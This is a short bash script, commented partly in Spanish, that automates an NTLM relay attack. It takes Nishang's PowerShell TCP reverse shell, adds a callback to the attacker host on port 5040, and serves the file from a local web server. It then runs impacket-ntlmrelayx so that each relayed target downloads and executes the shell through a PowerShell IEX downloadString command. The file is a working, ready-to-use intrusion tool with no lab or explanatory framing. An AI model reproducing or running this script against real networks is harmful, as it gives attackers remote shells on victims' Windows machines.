#!/usr/bin/env bash

LBlue='\033[0;94m'      # Ligth Blue
BRed='\033[1;31m'       # Bold Red
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [[ ! -f .attack && ! -f host.txt ]];do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Web Server...${Color_Off}\n"
    sleep 5
done

HOST=$(cat host.txt)

# Copiar Script de Nishan en PowerShell
if [ -f "/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1" ]; then
    cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
else
    echo -e "${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error copying PS.ps1${Color_Off}"
    exit 1
fi

# Agregando parametros al script de Nishang
echo "" >> PS.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress $HOST -Port 5040" >> PS.ps1

# Levantando servidor web local
PORT=${1:-8080}  # Puerto por defecto: 8000
python3 -m http.server "$PORT" &>/dev/null &

# Ejecutar ntlmrelayx con verificación
impacket-ntlmrelayx -tf target.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://$HOST:$PORT/PS.ps1')" -smb2support || {
    echo -e "${LBlue}[${BRed}✘${LBlue}] ${BWhite}Error executing impacket-ntlmrelayx${Color_Off}"
    #exit 1
}